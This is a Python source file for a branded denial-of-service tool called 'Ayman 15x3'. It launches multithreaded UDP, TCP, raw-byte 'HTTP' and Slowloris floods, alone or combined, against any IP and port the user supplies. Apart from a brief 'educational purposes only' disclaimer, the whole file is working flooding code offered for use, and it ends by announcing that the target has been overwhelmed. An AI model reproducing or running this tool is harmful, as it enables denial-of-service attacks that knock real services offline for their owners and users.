import random
import socket
import threading
import os
import time
import sys
import math
from datetime import datetime

# ----------- Colors -----------
GREEN = '\033[92m'
BLUE = '\033[94m'
GRAY = '\033[90m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ----------- Clear Screen -----------
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# ----------- Hacker Background Animation -----------
def hacker_background(duration=2):
    width = 70
    symbols = ['0', '1', '▒', '▓', '█', '░', '▓', '█', '▒', '1', '0']
    start_time = time.time()
    while time.time() - start_time < duration:
        line = ''.join(random.choice(symbols) for _ in range(width))
        print(GREEN + line + RESET)
        time.sleep(0.05)
        print("\033[F", end='')  # Move up to overwrite line

# ----------- Ayman 15x3 Logo -----------
def print_ayman_15x3_logo():
    logo = f"""
{GREEN} █████╗ ██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗
██╔══██╗╚██╗ ██╔╝████╗ ████║██╔══██╗████╗  ██║
███████║ ╚████╔╝ ██╔████╔██║███████║██╔██╗ ██║
██╔══██║  ╚██╔╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║
██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║ ╚████║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝

{YELLOW}        15x3 - Advanced Attack Tool
{RESET}"""
    print(logo)

# ----------- Welcome Message -----------
def welcome_message():
    print(f"{GREEN}╔══════════════════════════════════════════════════════════╗")
    print("║               Welcome to Ayman 15x3!                   ║")
    print("║           Advanced Penetration Testing Tool            ║")
    print("╚══════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(2)

# ----------- Disclaimer -----------
def show_disclaimer():
    clear_screen()
    print(RED + "╔══════════════════════════════════════════════════════════╗")
    print("║                     Disclaimer                         ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  This tool is for educational purposes only.            ║")
    print("║  Using it against systems without explicit permission   ║")
    print("║  is illegal. The author is not responsible for any      ║")
    print("║  misuse or damage.                                      ║")
    print("║                                                        ║")
    print("║  By using this tool, you agree to use it responsibly    ║")
    print("║  only on systems you own or have permission to test.    ║")
    print("╚══════════════════════════════════════════════════════════╝" + RESET)
    
    response = input(f"\n{GRAY}Do you agree to these terms? (y/n): {RESET}").lower()
    return response == 'y'

# ---------- Bots Counter -----------
class BotCounter:
    def __init__(self):
        self.count = 0
        self.lock = threading.Lock()
    
    def add_bots(self, num):
        with self.lock:
            self.count += num
            return self.count
    
    def get_count(self):
        with self.lock:
            return self.count

# ----------- Performance Optimizer -----------
class PerformanceOptimizer:
    @staticmethod
    def calculate_optimal_threads():
        # حساب عدد الثريدات الأمثل بناءً على قدرة النظام
        cpu_count = os.cpu_count() or 4
        return min(1000, max(100, cpu_count * 50))
    
    @staticmethod
    def calculate_optimal_packets(thread_count):
        # حساب عدد الحزم الأمثل بناءً على عدد الثريدات
        return min(10000, max(500, thread_count * 10))
    
    @staticmethod
    def optimize_socket():
        # تحسين إعدادات السوكيت لأداء أفضل
        try:
            socket.SO_REUSEADDR = 1
            socket.SO_REUSEPORT = 1
        except:
            pass

# ----------- Attack Classes -----------
class AymanAttack:
    def __init__(self, target_ip, target_port, bot_counter):
        self.target_ip = target_ip
        self.target_port = target_port
        self.bot_counter = bot_counter
        self.attack_active = False
        self.start_time = None
        self.sent_packets = 0
        self.stop_time = 0
        self.threads = PerformanceOptimizer.calculate_optimal_threads()
        self.packets = PerformanceOptimizer.calculate_optimal_packets(self.threads)
        
        # تحسين إعدادات السوكيت
        PerformanceOptimizer.optimize_socket()
        
    # UDP Flood Attack - أسرع
    def udp_flood(self):
        data = random._urandom(1024)
        self.bot_counter.add_bots(1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while self.attack_active:
                try:
                    # إرسال حزم متعددة في حلقة واحدة بدون إغلاق السوكيت
                    for _ in range(self.packets):
                        if not self.attack_active:
                            break
                        sock.sendto(data, (self.target_ip, self.target_port))
                        self.sent_packets += 1
                except:
                    # إعادة إنشاء السوكيت في حالة الخطأ
                    try:
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        finally:
            try:
                sock.close()
            except:
                pass
            self.bot_counter.add_bots(-1)
    
    # TCP Flood Attack - أسرع
    def tcp_flood(self):
        data = random._urandom(999)
        self.bot_counter.add_bots(1)
        
        while self.attack_active:
            try:
                # استخدام اتصال مستمر لإرسال حزم متعددة
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                for _ in range(self.packets):
                    if not self.attack_active:
                        break
                    sock.send(data)
                    self.sent_packets += 1
                    
                sock.close()
            except:
                try:
                    sock.close()
                except:
                    pass
        
        self.bot_counter.add_bots(-1)
    
    # HTTP Flood Attack - أسرع
    def http_flood(self):
        data = random._urandom(818)
        self.bot_counter.add_bots(1)
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                for _ in range(self.packets):
                    if not self.attack_active:
                        break
                    sock.send(data)
                    self.sent_packets += 1
                    
                sock.close()
            except:
                try:
                    sock.close()
                except:
                    pass
        
        self.bot_counter.add_bots(-1)
    
    # Slowloris Attack - محسن
    def slowloris_flood(self):
        self.bot_counter.add_bots(1)
        
        headers = [
            f"GET /?{random.randint(0, 2000)} HTTP/1.1",
            f"Host: {self.target_ip}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive"
        ]
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # إرسال جميع الهيدرات مرة واحدة
                sock.send(("\r\n".join(headers) + "\r\n\r\n").encode())
                
                # إبقاء الاتصال مفتوحاً وإرسال بيانات دورية
                while self.attack_active and time.time() < self.stop_time:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.sent_packets += 1
                        time.sleep(random.randint(10, 20))
                    except:
                        break
                
                sock.close()
            except:
                try:
                    sock.close()
                except:
                    pass
                time.sleep(1)
        
        self.bot_counter.add_bots(-1)
    
    # Start Attack
    def start_attack(self, attack_type):
        self.attack_active = True
        self.start_time = datetime.now()
        self.stop_time = time.time() + 1000000  # Large default stop time
        self.sent_packets = 0
        
        attack_methods = {
            'udp': self.udp_flood,
            'tcp': self.tcp_flood,
            'http': self.http_flood,
            'slowloris': self.slowloris_flood
        }
        
        print(YELLOW + f"\n🔥 Starting attack on {self.target_ip}:{self.target_port}" + RESET)
        print(YELLOW + f"📊 Using {attack_type.upper()} method" + RESET)
        print(YELLOW + f"🧵 Auto threads: {self.threads}" + RESET)
        print(YELLOW + f"📦 Auto packets: {self.packets}" + RESET)
        print(RED + "⏸️  Press Ctrl+C to stop the attack" + RESET)
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_methods[attack_type])
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while self.attack_active:
                elapsed = datetime.now() - self.start_time
                bots = self.bot_counter.get_count()
                # حساب سرعة الهجوم (حزم في الثانية)
                speed = self.sent_packets / (elapsed.seconds + 0.001)
                print(GREEN + f"\r⏰ Elapsed: {elapsed.seconds}s | 📦 Packets: {self.sent_packets} | 🚀 Speed: {speed:.0f}p/s | 🤖 Bots: {bots}", end="")
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_attack()
    
    # Stop Attack
    def stop_attack(self):
        self.attack_active = False
        elapsed = datetime.now() - self.start_time
        speed = self.sent_packets / (elapsed.seconds + 0.001)
        print(GREEN + f"\n\n✅ Attack stopped. Duration: {elapsed.seconds}s, Total packets: {self.sent_packets}, Avg speed: {speed:.0f}p/s" + RESET)
        time.sleep(2)

# ----------- Success Animation -----------
def success_animation():
    print(f"\n{GREEN}✅ Attack successful! Loading Ayman logo...{RESET}")
    time.sleep(1)
    clear_screen()
    print_ayman_15x3_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════╗")
    print("║                  ATTACK SUCCESSFUL!                   ║")
    print("║           Target has been overwhelmed                 ║")
    print("╚══════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(3)

# ----------- Main Menu -----------
def show_menu():
    clear_screen()
    print_ayman_15x3_logo()
    print(GREEN + "═"*60)
    print(f"{GREEN}1. UDP Flood Attack (Fast)")
    print("2. TCP Flood Attack (Fast)")
    print("3. HTTP Flood Attack (Fast)")
    print("4. Slowloris Attack (Stealth)")
    print("5. Multi-Method Attack (All Methods)")
    print(f"{RED}0. Exit{RESET}")
    print(GREEN + "═"*60)
    
    while True:
        try:
            choice = int(input(f"{GRAY}Choose an option (0-5): {RESET}"))
            if 0 <= choice <= 5:
                return choice
            else:
                print(RED + "Invalid choice. Please try again." + RESET)
        except ValueError:
            print(RED + "Please enter a valid number." + RESET)

# ----------- Main Program -----------
if __name__ == "__main__":
    if not show_disclaimer():
        print(RED + "\nYou must agree to the terms to use this tool. Exiting..." + RESET)
        time.sleep(2)
        sys.exit()
    
    clear_screen()
    hacker_background(duration=2)
    clear_screen()
    print_ayman_15x3_logo()
    welcome_message()
    
    bot_counter = BotCounter()
    
    while True:
        choice = show_menu()
        
        if choice == 0:
            print(GREEN + "\n👋 Thank you for using Ayman 15x3. Goodbye!" + RESET)
            time.sleep(1)
            break
        
        # Get attack parameters
        clear_screen()
        print_ayman_15x3_logo()
        print(GREEN + "═"*50)
        print(f"{BOLD}⚙️  Attack Settings{RESET}")
        print("═"*50 + RESET)
        
        try:
            ip = input(GRAY + "🎯 Target IP: " + RESET)
            port = int(input(GRAY + "🚪 Target Port: " + RESET))
            
            attack = AymanAttack(ip, port, bot_counter)
            
            if choice == 1:
                attack.start_attack('udp')
                success_animation()
            elif choice == 2:
                attack.start_attack('tcp')
                success_animation()
            elif choice == 3:
                attack.start_attack('http')
                success_animation()
            elif choice == 4:
                attack.start_attack('slowloris')
                success_animation()
            elif choice == 5:
                # Multi-method attack
                methods = ['udp', 'tcp', 'http', 'slowloris']
                attack.attack_active = True
                attack.start_time = datetime.now()
                attack.stop_time = time.time() + 1000000
                
                print(YELLOW + f"\n🔥 Starting multi-attack on {ip}:{port}" + RESET)
                print(YELLOW + f"🧵 Auto threads: {attack.threads}" + RESET)
                print(YELLOW + f"📦 Auto packets: {attack.packets}" + RESET)
                print(RED + "⏸️  Press Ctrl+C to stop the attack" + RESET)
                
                # Start all attack methods
                attack_threads = []
                for method in methods:
                    for _ in range(attack.threads // 4):
                        t = threading.Thread(target=getattr(attack, f"{method}_flood"))
                        t.daemon = True
                        t.start()
                        attack_threads.append(t)
                
                try:
                    while attack.attack_active:
                        elapsed = datetime.now() - attack.start_time
                        bots = bot_counter.get_count()
                        speed = attack.sent_packets / (elapsed.seconds + 0.001)
                        print(GREEN + f"\r⏰ Elapsed: {elapsed.seconds}s | 📦 Packets: {attack.sent_packets} | 🚀 Speed: {speed:.0f}p/s | 🤖 Bots: {bots}", end="")
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    attack.stop_attack()
                success_animation()
            
            input(GRAY + "\n\nPress Enter to continue..." + RESET)
            
        except ValueError:
            print(RED + "Invalid input. Please enter a valid port number." + RESET)
            time.sleep(2)
        except Exception as e:
            print(RED + f"An error occurred: {str(e)}" + RESET)
            time.sleep(2)